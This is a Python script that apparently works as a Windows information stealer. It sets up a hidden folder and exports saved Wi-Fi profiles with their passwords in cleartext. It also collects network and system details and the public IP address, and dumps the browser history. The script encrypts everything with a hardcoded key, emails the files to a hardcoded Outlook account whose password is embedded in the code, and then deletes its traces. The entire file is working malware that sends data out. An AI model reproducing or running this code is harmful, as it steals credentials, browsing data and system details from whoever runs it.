import re, smtplib, os, requests, shutil, subprocess, socket, pathlib, win32api, win32con, json, logging, sys
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import browserhistory as bh
from cryptography.fernet import Fernet

subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'browserhistory'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pywin32'])



def email_base(name, email_address):
    name['From'] = email_address
    name['To'] =  email_address
    name['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    name.attach(MIMEText(body, 'plain'))
    return name

def smtp_handler(email_address, password, name):
    s = smtplib.SMTP('smtp.outlook.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, name.as_string())
    s.quit()

def send_email(path): 
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')

    email_address = 'FillEminos@outlook.com'
    password = 'WluoAx8mQE0mQU4iq45K'

    msg = MIMEMultipart()
    email_base(msg, email_address)

    for dirpath, dirnames, filenames in os.walk(path, topdown=True):
        dirnames[:] = [d for d in dirnames]
        for file in filenames:
            if regex.match(file) or regex2.match(file):

                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 
                                'filename = {}'.format(file))
                msg.attach(p)
    else:
        pass

    smtp_handler(email_address, password, msg)

def main():
    shutil.rmtree('C:\\Users\\Public\\Logs')
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    file_path = 'C:\\Users\\Public\\Logs\\'
    win32api.SetFileAttributes('C:\\Users\\Public\\Logs\\', win32con.FILE_ATTRIBUTE_HIDDEN)

##### Retrieve Network/Wifi informaton for the network_wifi file ################################################################
    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
        try:
            commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 
                                        'folder=C:\\Users\\Public\\Logs\\', 'key=clear', 
                                        '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 
                                        'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'], 
                                        stdout=network_wifi, stderr=network_wifi, shell=True)
            outs, errs = commands.communicate(timeout=60)

        except subprocess.TimeoutExpired:
            commands.kill()
            out, errs = commands.communicate()

##### Retrieve system information for the system_info file ######################################################################
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    with open(file_path + 'system_info.txt', 'a') as system_info:
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except requests.ConnectionError:
            public_ip = '* Ipify connection failed *'
            pass

        system_info.write('Public IP Address: ' + public_ip + '\n' \
                          + 'Private IP Address: ' + IPAddr + '\n')
        try:
            get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], 
                            stdout=system_info, stderr=system_info, shell=True)
            outs, errs = get_sysinfo.communicate(timeout=15)

        except subprocess.TimeoutExpired:
            get_sysinfo.kill()
            outs, errs = get_sysinfo.communicate()

##### Get the browsing history ##################################################################################################
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))

##### Encrypt files #############################################################################################################
    files = ['network_wifi.txt', 'system_info.txt', 'browser.txt']

    regex = re.compile(r'.+\.xml$')
    dir_path = 'C:\\Users\\Public\\Logs'

    for dirpath, dirnames, filenames in os.walk(dir_path):
        [ files.append(file) for file in filenames if regex.match(file) ]
    
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    for file in files:
        with open(file_path + file, 'rb') as plain_text:
            data = plain_text.read()
        encrypted = Fernet(key).encrypt(data)
        with open(file_path + 'e_' + file, 'ab') as hidden_data:
            hidden_data.write(encrypted)
        os.remove(file_path + file)

##### Send encrypted files to email account #####################################################################################
    send_email('C:\\Users\\Public\\Logs')
    shutil.rmtree('C:\\Users\\Public\\Logs')


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, \
                            filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))
        pass


